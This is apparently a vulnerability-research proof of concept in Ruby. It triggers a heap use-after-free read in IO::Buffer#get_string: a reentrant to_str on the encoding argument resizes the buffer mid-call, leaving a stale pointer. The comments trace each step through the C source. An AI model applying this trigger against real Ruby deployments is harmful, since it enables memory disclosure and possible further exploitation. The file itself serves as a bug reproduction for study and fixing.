# H14/H137 — IO::Buffer#get_string heap-UAF via reentrant encoding to_str.
#
# io_buffer_get_string (io_buffer.c:3253):
#   1. extract offset/length
#   2. io_buffer_get_bytes_for_reading -> local `base` = buffer->base   (line 3262)
#   3. rb_find_encoding(argv[2])  -> StringValue -> evil.to_str RUNS     (line 3266)
#         => buffer.resize(BIG) -> realloc moves internal buffer, old block freed,
#            buffer->base = new, buffer->size = BIG
#   4. io_buffer_validate_range(buffer, offset, length)                  (line 3272)
#         => for a NON-slice buffer io_buffer_validate() returns 1 unconditionally;
#            only checks buffer->size (now BIG) => passes
#   5. data = base + offset  (STALE freed pointer)                       (line 3274)
#   6. rb_enc_str_new(data, length) reads `length` bytes from freed block => UAF READ

$buf = IO::Buffer.new(64)   # INTERNAL, non-slice, not locked

evil = Object.new
def evil.to_str
  # grow massively to force realloc to move (old 64B block freed)
  $buf.resize(64 * 1024 * 1024)
  "UTF-8"
end

# offset=0, length=32 (< new size so validate_range passes), encoding=evil
res = $buf.get_string(0, 32, evil)
puts "no crash, got #{res.bytesize} bytes"
